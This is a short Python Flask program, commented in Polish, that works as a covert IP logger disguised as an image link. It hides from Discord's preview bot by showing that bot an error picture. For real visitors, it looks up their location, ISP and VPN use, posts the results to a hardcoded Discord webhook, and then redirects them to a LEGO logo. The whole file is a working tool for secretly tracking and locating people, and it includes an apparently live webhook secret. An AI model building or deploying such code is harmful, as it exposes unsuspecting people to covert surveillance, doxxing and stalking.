from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"
ERROR_IMG = "https://i.imgur.com/8N9vX7o.png"
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Cloaking: Bot Discorda widzi obrazek bledu, czlowiek jest logowany
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ERROR_IMG)

    geo, vpn = "Brak", "Nieznany"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,hosting", timeout=3).json()
        if r.get("status") == "success":
            geo = f"{r.get('city')}, {r.get('country')} ({r.get('isp')})"
            vpn = "TAK" if (r.get('proxy') or r.get('hosting')) else "NIE"
    except:
        pass

    payload = {
        "embeds": [{
            "title": "🎯 Nowy Log!",
            "color": 15548997,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "VPN", "value": f"`{vpn}`", "inline": True},
                {"name": "LOKALIZACJA", "value": f"`{geo}`", "inline": False}
            ]
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
    except:
        pass

    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(port=10000)
